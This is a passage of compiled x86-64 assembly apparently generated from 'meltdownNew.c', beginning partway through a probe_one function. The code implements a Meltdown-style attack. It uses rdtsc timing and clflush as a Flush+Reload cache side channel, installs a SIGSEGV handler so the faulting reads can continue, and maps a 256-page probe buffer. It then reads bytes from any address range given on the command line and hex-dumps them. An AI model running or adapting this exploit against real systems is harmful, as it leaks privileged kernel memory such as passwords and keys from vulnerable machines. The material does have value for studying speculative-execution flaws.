	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2344(%rbp)
	movq	-2344(%rbp), %rax
	movq	%rax, %rcx
#APP
# 118 "meltdownNew.c" 1
	mfence
	lfence
	rdtsc
	lfence
	movl	%eax, %esi
	movl	(%rcx), %eax
	lfence
	rdtsc
	subl	%esi, %eax
	clflush	0(%rcx)
# 0 "" 2
#NO_APP
	movq	%rax, -2368(%rbp)
	movq	-2368(%rbp), %rdx
	movl	-2388(%rbp), %eax
	cltq
	movq	%rdx, -2336(%rbp,%rax,8)
	addl	$1, -2388(%rbp)
.L6:
	cmpl	$255, -2388(%rbp)
	jle	.L8
	movl	$0, -2388(%rbp)
	jmp	.L9
.L12:
	movl	-2384(%rbp), %eax
	cltq
	movq	-2336(%rbp,%rax,8), %rax
	movl	-2388(%rbp), %edx
	movslq	%edx, %rdx
	movq	-2336(%rbp,%rdx,8), %rdx
	cmpq	%rax, %rdx
	jnb	.L10
	movl	-2388(%rbp), %eax
	jmp	.L11
.L10:
	movl	-2384(%rbp), %eax
.L11:
	movl	%eax, -2384(%rbp)
	addl	$1, -2388(%rbp)
.L9:
	cmpl	$255, -2388(%rbp)
	jle	.L12
	movl	-2384(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	leal	1(%rax), %edx
	movl	-2384(%rbp), %eax
	cltq
	movb	%dl, -288(%rbp,%rax)
	addl	$1, -2392(%rbp)
.L3:
	movl	-2392(%rbp), %eax
	cmpl	-2376(%rbp), %eax
	jl	.L13
	movl	$0, -2388(%rbp)
	jmp	.L14
.L17:
	movl	-2388(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %edx
	movl	-2380(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	cmpb	%dl, %al
	jnb	.L15
	movl	-2388(%rbp), %eax
	jmp	.L16
.L15:
	movl	-2380(%rbp), %eax
.L16:
	movl	%eax, -2380(%rbp)
	addl	$1, -2388(%rbp)
.L14:
	cmpl	$255, -2388(%rbp)
	jle	.L17
	movl	-2380(%rbp), %eax
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L19
	call	__stack_chk_fail@PLT
.L19:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	probe_one, .-probe_one
	.section	.rodata
.LC0:
	.string	"0x%016lx | "
.LC1:
	.string	"%02X "
.LC2:
	.string	"|  %s \n"
.LC3:
	.string	"   "
	.text
	.globl	dump_hex
	.type	dump_hex, @function
dump_hex:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movb	$0, -16(%rbp)
	movq	-56(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -48(%rbp)
	jmp	.L21
.L30:
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$31, %al
	jbe	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$126, %al
	ja	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %edx
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	%dl, -32(%rbp,%rax)
	jmp	.L23
.L22:
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	$46, -32(%rbp,%rax)
.L23:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$7, %eax
	testq	%rax, %rax
	je	.L24
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
.L24:
	movl	$32, %edi
	call	putchar@PLT
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L26
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L25
.L26:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movb	$0, -32(%rbp,%rax)
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	cmpq	$8, %rax
	ja	.L27
	movl	$32, %edi
	call	putchar@PLT
.L27:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movq	%rax, -40(%rbp)
	jmp	.L28
.L29:
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addq	$1, -40(%rbp)
.L28:
	cmpq	$15, -40(%rbp)
	jbe	.L29
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L25:
	addq	$1, -48(%rbp)
.L21:
	movq	-48(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jb	.L30
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L31
	call	__stack_chk_fail@PLT
.L31:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	dump_hex, .-dump_hex
	.section	.rodata
	.align 8
.LC4:
	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
.LC5:
	.string	"mmap() failed: %s\n"
	.align 8
.LC6:
	.string	"poke buffer: %p, page size: %i\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$264, %rsp
	.cfi_offset 3, -24
	movl	%edi, -260(%rbp)
	movq	%rsi, -272(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	call	getpagesize@PLT
	movl	%eax, -244(%rbp)
	movl	$0, -248(%rbp)
	movq	$0, -232(%rbp)
	movq	$0, -224(%rbp)
	leaq	-208(%rbp), %rax
	movl	$152, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	leaq	-208(%rbp), %rax
	addq	$8, %rax
	movq	%rax, %rdi
	call	sigemptyset@PLT
	leaq	sigaction_segv(%rip), %rax
	movq	%rax, -208(%rbp)
	movl	$4, -72(%rbp)
	leaq	-208(%rbp), %rax
	movl	$0, %edx
	movq	%rax, %rsi
	movl	$11, %edi
	call	sigaction@PLT
	cmpl	$2, -260(%rbp)
	jle	.L33
	cmpl	$4, -260(%rbp)
	jle	.L34
.L33:
	movq	-272(%rbp), %rax
	movq	(%rax), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L47
.L34:
	movq	-272(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movl	$16, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -232(%rbp)
	movq	-272(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	movl	$10, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -224(%rbp)
	cmpl	$4, -260(%rbp)
	jne	.L36
	movl	$1, -248(%rbp)
.L36:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	cltq
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$33, %ecx
	movl	$3, %edx
	movq	%rax, %rsi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -216(%rbp)
	cmpq	$-1, -216(%rbp)
	jne	.L37
	call	__errno_location@PLT
	movl	(%rax), %eax
	movl	%eax, %edi
	call	strerror@PLT
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$-1, %eax
	jmp	.L47
.L37:
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -240(%rbp)
	jmp	.L38
.L41:
	cmpl	$0, -248(%rbp)
	jne	.L39
	cmpq	$0, -240(%rbp)
	je	.L39
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L39
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	addq	%rdx, %rax
	subq	$16, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movl	$16, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L39:
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rbx
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	probe_one
	movb	%al, -48(%rbp,%rbx)
	cmpl	$0, -248(%rbp)
	je	.L40
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	leaq	-48(%rbp), %rax
	addq	%rdx, %rax
	movl	$1, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	call	write@PLT
.L40:
	addq	$1, -240(%rbp)
.L38:
	movq	-240(%rbp), %rax
	cmpq	-224(%rbp), %rax
	jb	.L41
	cmpl	$0, -248(%rbp)
	jne	.L42
	cmpq	$0, -240(%rbp)
	je	.L42
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	je	.L43
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	jmp	.L44
.L43:
	movl	$16, %edx
.L44:
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L45
	movq	-240(%rbp), %rax
	subq	$1, %rax
	andq	$-16, %rax
	jmp	.L46
.L45:
	movq	-240(%rbp), %rax
	andq	$-16, %rax
.L46:
	movq	-232(%rbp), %rcx
	addq	%rcx, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L42:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	movslq	%eax, %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	munmap@PLT
	movl	$0, %eax
.L47:
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L48
	call	__stack_chk_fail@PLT
.L48:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE14:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:

